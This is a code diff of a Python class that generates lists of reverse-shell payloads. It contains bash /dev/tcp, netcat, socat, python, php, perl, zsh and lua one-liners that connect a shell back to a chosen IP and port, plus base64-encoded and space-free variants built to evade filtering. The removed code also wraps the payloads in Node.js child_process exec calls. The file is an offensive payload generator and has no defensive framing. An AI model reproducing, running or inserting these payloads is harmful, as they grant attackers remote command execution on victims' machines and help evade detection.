@@ -1,78 +1,57 @@
+from rich.pretty import pprint
 import base64
-import os
 
-class PayLoads:
 
-    def __init__(self, ip, port, node=False):
+class CreatePayloads:
+    def __init__(self, ip, port, windows=False):
         self.ip = ip
         self.port = port
-        self.use_node = node
+        self.use_windows = windows
 
-    def nodejs(self, payloads):
-        node_payloads = []
-        for ini_payload in payloads:
-            nodejs_payload = f'''require('child_process').exec("{ini_payload}")'''
-            node_payloads.append(nodejs_payload)
-        return node_payloads
+    def Linux(self):
+        payloads = ['0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196',
+                    '/bin/bash -c "/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"',
+                    'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done',
+                    'sh -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5',
+                    "socat TCP:{ip}:{port} EXEC:'sh',pty,stderr,setsid,sigint,sane",
+                    'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\' ',
+                    'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\' ',
+                    'mkfifo /tmp/lol;nc {ip} {port} 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol',
+                    'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f',
+                    'TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | sh 1>$TF',
+                    'php -r \'$sock=fsockopen("{ip}",{port});exec("sh <&3 >&3 2>&3");\'',
+                    'php -r \'$sock=fsockopen("{ip}",{port});shell_exec("sh <&3 >&3 2>&3");\'',
+                    'php -r \'$sock=fsockopen("{ip}",{port});system("sh <&3 >&3 2>&3");\'',
+                    'php -r \'$sock=fsockopen("{ip}",{port});`sh <&3 >&3 2>&3`;\'',
+                    'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
+                    'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'',
+                    "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
+                    'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{ip}\',\'{port}\');os.execute(\'/bin/sh -i <&3 >&3 2>&3\');" ']
 
-    def base64_payloads(self, payloads):
+        """Replace Setup ip and port in payloads"""
+        ready_payloads = []
+        for payload in payloads:
+            payload = payload.replace("{ip}", self.ip)
+            payload = payload.replace("{port}", str(self.port))
+            ready_payloads.append(payload)
+
+        """No Space"""
+        no_space = []
+        for payload in ready_payloads:
+            payload = payload.encode("utf-8")
+            encoded = base64.b64encode(payload).decode('utf-8')
+            forged = "/bin/bash -c '{echo," + f"{encoded}" + "}|{base64,-d}|{bash,-i}'"
+            no_space.append(forged)
+
+        """Encode Base64"""
         base64_payloads = []
-        for payload in payloads:
-            cli = payload.encode("utf-8")
-            encoded = base64.b64encode(cli).decode('utf-8')
-            base64_payload = "bash -c '{echo," + f"{encoded}" + "}|{base64,-d}|{bash,-i}'"
-            base64_payloads.append(base64_payload)
-        return base64_payloads
+        for payload in ready_payloads:
+            payload = payload.encode("utf-8")
+            encoded = base64.b64encode(payload).decode('utf-8')
+            forged = "/bin/bash -c 'echo " + f"{encoded}" + "|base64 -d|bash -i'"
+            base64_payloads.append(forged)
 
-    def bash_space(self,payloads):
-        bash_space=[]
-        for payload in payloads:
-            cli = payload.encode("utf-8")
-            encoded = base64.b64encode(cli).decode('utf-8')
-            d=f'''bash -c "echo '{encoded}'" | base64 -d | bash -i'''
-            bash_space.append(d)
-        return bash_space
+        # pprint(base64_payloads)
+        # pprint(no_space)
+        return ready_payloads + base64_payloads + no_space
 
-
-    def payloads(self):
-        ip = self.ip
-        port = self.port
-        # BASH payloads
-        BASH196 = f'''0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196'''
-        BASH_DEV = f'''/bin/bash -c "/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"'''
-        BASH_READLINE = f'''exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'''
-        BASH5 = f'''sh -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5'''
-
-        # socat payloads
-        SOCAT = f'''socat TCP:{ip}:{port} EXEC:'sh',pty,stderr,setsid,sigint,sane'''
-
-        # python payloads
-        PYTHON2 = f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''''
-        PYTHON3 = f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''''
-
-        # BSD payloads
-        BSD = f'''mkfifo /tmp/lol;nc {ip} {port} 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol'''
-        BSD2= f'''rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f'''
-
-        # telnet payloads
-        TELNET = f'''TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | sh 1>$TF'''
-
-        # php payloads
-        EXEC1 = f'''php -r '$sock=fsockopen("{ip}",{port});exec("sh <&3 >&3 2>&3");\''''
-        SHELL_EXEC = f'''php -r '$sock=fsockopen("{ip}",{port});shell_exec("sh <&3 >&3 2>&3");\''''
-        SYSTEM = f'''php -r '$sock=fsockopen("{ip}",{port});system("sh <&3 >&3 2>&3");\''''
-        WEIRD_QOUTE = f'''php -r '$sock=fsockopen("{ip}",{port});`sh <&3 >&3 2>&3`;\''''
-        # perl payloads
-        PERL = f'''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))''' + '{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};\''
-        PERL_NO_SH = f'''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''''
-
-        # zsh payloads
-        ZSH = f'''zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\''''
-        LUA=f'''lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"'''
-        payloads = [value for name, value in locals().items() if name.isupper()]
-        bash_space= self.bash_space(payloads)
-        base64_payloads = self.base64_payloads(payloads)
-
-        if self.use_node:
-            return self.nodejs(payloads + bash_space + base64_payloads)
-        return  payloads + bash_space + base64_payloads 
